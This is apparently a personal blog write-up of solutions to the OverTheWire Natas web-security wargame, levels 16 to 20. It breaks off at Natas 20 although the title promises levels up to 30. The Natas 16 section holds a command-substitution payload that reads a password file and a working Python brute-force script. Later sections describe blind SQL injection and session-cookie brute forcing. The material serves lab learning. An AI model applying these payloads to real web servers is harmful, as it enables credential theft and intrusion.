---
layout: article
key: 202003230
pageview: true
title: Natas Wargames Solutions (16-30)
tags: ctf
excerpt: My followup writeup to challenges that I solved in Natas Wargames
---

## Overview

These set of challenges on the Wargames are focussed on Web Application Security Testing and Scanning. Each machine stores the credentials for the next machine. **All passwords are also stored in /etc/natas_webpass/**. In this article, I cover the solutions from 16-34.

These are followup to the challenges post which I put out earlier for the challenges 1-15.





### Natas 16

This one presents us with the possibility of command injection. But there is a twist - There is a filtering on characters like ';', '|' /[;|&`\'"]/ etc. This removes the possibility of simply appending a command and getting it executed. Remember, our goal here is to read the contents of the file **/etc/natas_webpass/natas17**. 

The first clue is if we search for something like "__^He__". Note that the "^" is not in the list of illegal characters. We get all the words starting from the letters "He" like He , Hebrew etc. 

The question we should be asking is __"What if we could use the contents of the target file to perform the search? "__

Look at the expression

```bash
^$(grep -o ^A /etc/natas_webpass/natas17)
```

What this expression is doing is searching for a prefix "A", i.e checking whether the password is starting with  A, and then using the result of the inner prefix search to feed the outer "^" . If the password does start with an A, it would simply return the letter A (The matched prefix), and if it fails the grep returns null, so the command simply becomes ^null , and we search for ^ which returns all words. However we could simply add a letter , say "I" after the above expression.

```bash
^$(grep -o ^A /etc/natas_webpass/natas17)I
```

What do we get now? If the inner grep fails (the prefix guess is incorrect), the query resolves to **^I** , and if the inner query is successful, the query resolves to **^{matched prefix}I**. If we search for the letter I, the results always begin with the single personal pronoun "I".

So here we start by launching a bruteforce attack on all the characters in keyspace [a-zA-Z0-9] across the length of the password(same length for all levels). We can automate this in python with the powerful **requests** module which supports multiple http authentication types. The script is shown below. 

```python
import requests
from requests.auth import HTTPBasicAuth


#identified sample=^$(grep -o ^Wa natas16)I

user='natas16'
passw='WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
#clumsy but manageable
keyspace="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
leet = ""
for i in range(len(passw)):
    
    #if inner loop's guess is wrong then exploit will return I
    for j in range(len(keyspace)):
        expl ="^$(grep -o ^{} /etc/natas_webpass/natas17)I".format(leet+keyspace[j])
        #print(expl)
        payload= {'needle': expl, 'submit': 'Search'}
        answer=requests.get('http://natas16.natas.labs.overthewire.org/', params=payload,auth=HTTPBasicAuth(user,passw))
        str1 = answer.text
        start = str1.find('<pre>\n')+len('<pre>\n')
        end = str1.find('</pre>')
        str2=[x for x in str1[start:end].split("\n")]
        #print(str2[0])
        if str2[0]!='I':
            leet+=keyspace[j]
            print(leet)
            break
print(leet)

```

Good programming excercise to get command injection.



### Natas 17

To get the credentials of Natas18, we need to launch a blind SQL injection attack as the outputs of the SQL query are being consumed by the web server to prevent diagnosis. To achieve this , a good programming excercise is to write your own tool in python . However, I used SQLMap which performs the blind SQL injection attack and prints the password.



### Natas 18

The idea here is to login as admin, and get the web application to display the password for the next level. However, the admin does not have a brute-forcible password. The point of target here then becomes to guess the PHPSESSID of the admin. In a comment in the source code , it is mentioned that the PHPSESSID has only 640 possible values - which means we should be able to bruteforce it easily.

While you may write a python code, to solve this level, I used BurpSuite's intruder to bruteforce the cookies field. 



### Natas 19

Idea to get the solution here is very similar to the earlier level. Instead of sequential PHPSESSID , it is now a hex encoded value of this {session number}-{username}.  Here, we just bruteforce the session number again, and append it with the targeted username of admin, and then convert it to hex. This can be done by Intruder, and it allows for conversion to hex and adding a suffix to the target payload with ease to the targeted payload.



### Natas 20

To solve this challenge, we must  once again read and analyze the underlying PHP source code. We are logged in as regular user, and we must login as admin. 







